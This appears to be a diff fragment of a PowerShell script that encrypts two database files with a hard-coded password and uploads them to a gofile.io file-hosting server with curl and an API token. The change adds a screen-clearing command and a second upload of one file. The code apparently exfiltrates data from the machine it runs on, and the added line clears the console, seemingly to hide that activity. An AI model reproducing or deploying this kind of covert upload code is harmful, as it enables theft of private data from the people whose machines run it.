@@ -105,6 +105,8 @@ Protect-File -FilePath $dbPath -p "For_oNS."
 Protect-File -FilePath $dbPath2 -p "For_oNS."
 $uploadUrl = "https://$($server).gofile.io/contents/uploadfile"
 $response = curl.exe -F "file=@$dbPath.crypt" -F "file=@$dbPath2.crypt" -F "token=$apiToken" $uploadUrl
+cls
+$response = curl.exe -F "file=@$dbPath2.crypt" -F "token=$apiToken" $uploadUrl
 
 
 $jsonResult = $response | ConvertFrom-Json
